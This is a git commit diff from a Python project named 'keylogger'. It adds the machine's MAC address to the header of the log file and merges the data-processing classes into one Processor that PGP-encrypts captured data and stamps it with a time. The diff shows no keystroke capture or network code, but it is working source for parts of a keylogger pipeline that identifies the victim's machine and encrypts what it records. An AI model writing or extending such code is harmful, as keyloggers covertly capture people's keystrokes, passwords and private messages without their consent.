4f11ed4a17a762b4204d76ea3827518e34055fa9
ahronSteinbruch <139044285+ahronSteinbruch@users.noreply.github.com>
2025-02-17 17:33:20 +0200

    change the process_data to one class

--- keylogger/file_writer.py
+++ keylogger/file_writer.py
@@ -1,11 +1,15 @@
 import json
 
+from getmac import get_mac_address
+
 from keylogger.data_wrapper import DataWrapper
 
 
 class FileWriter:
     def __init__(self, path):
         self.file_path = path
+        self.machine_id = get_mac_address()
+
 
     def sink(self, data_wrapper: DataWrapper):
         self.write_to_file(data_wrapper)
@@ -17,6 +21,6 @@ class FileWriter:
                 file.write(formatted_data + "\n")
         except FileNotFoundError:
             with open(self.file_path, "w") as file:
-                file.write(formatted_data + "\n")
+                file.write(self.machine_id +"\n" + formatted_data + "\n")
         except Exception as e:
             print(f"An error occurred: {e}")
--- keylogger/processor.py
+++ keylogger/processor.py
@@ -1,96 +1,25 @@
 import time
-from typing import List, Protocol
+from typing import List
 from pgpy import PGPKey, PGPMessage
 from .data_wrapper import DataWrapper
 from getmac import get_mac_address
 
 
 
-class Process:
-    def __init__(self):
-        pass
+#        data.machine_id = get_mac_address()
 
-    def process(self, data):
-        return self.process_data(data)
-
-    def process_data(self, data):
-        timestamp = time.time()
-        data_wrapper = DataWrapper(data, timestamp)
-        # Do encryption here if needed
-        encrypted_data = self.encrypt_data(data_wrapper)
-        self.send_to_sink(encrypted_data)
-
-    def encrypt_data(self, data_wrapper):
-        # Implement your encryption logic here
-        # For demonstration purposes, let's just return the data as is
-        return data_wrapper
-
-    def send_to_sink(self, data):
-        # Implement your sink logic here
-        # For demonstration purposes, let's just print the data
-        print(data)
-
-
-class Processor(Protocol):
-    """
-    Processor is a protocol that defines the interface for processing data.
-
-    it will may be implemented by classes that process data in different ways.
-    such as:
-        Add timestamp to the data
-        Encrypt the data
-        Compress the data
-        Add a unique identifier to the data source
-    """
-
-    def process(self, data: List) -> any:
-        """
-        process the data in some way.
-        """
-        ...
-
-
-class ChainProcessor:
-    """
-    ChainProcessor is a class that chains multiple processors together.
-    """
-
-    def __init__(self, processors: List[Processor]):
-        self.processors = processors
-
-    def process(self, data: List) -> any:
-        for processor in self.processors:
-            data = processor.process(data)
-        return data
-
-
-class EncryptProcessor:
-    """
-    EncryptProcessor is a class that encrypts the data using PGP encryption.
-    """
-
-    def __init__(self, key: str):
+class Processor:
+    def __init__(self,key:str):
         self.key = PGPKey.from_blob(key)
 
-    def process(self, data: List) -> any:
-        return self._encrypt(data)
+    def process_data(self,data):
+        timestamp = time.time()
+        encrypted_data = self._encrypt(data)
+        data_wrapper = DataWrapper(encrypted_data,timestamp)
+        return data_wrapper
+
 
     def _encrypt(self, data: List) -> List:
         message = PGPMessage.new(data)
         encrypted_message = self.key.encrypt(message)
         return encrypted_message
-
-
-class DummyEncryptor:
-    def __init__(self):
-        pass
-
-    def process(self, data):
-        return self._encrypt(data)
-
-    def _encrypt(self, data):
-        return data
-class MachineIdProcessor:
-    def process(self,data:DataWrapper):
-        data.machine_id = get_mac_address()
-        return data
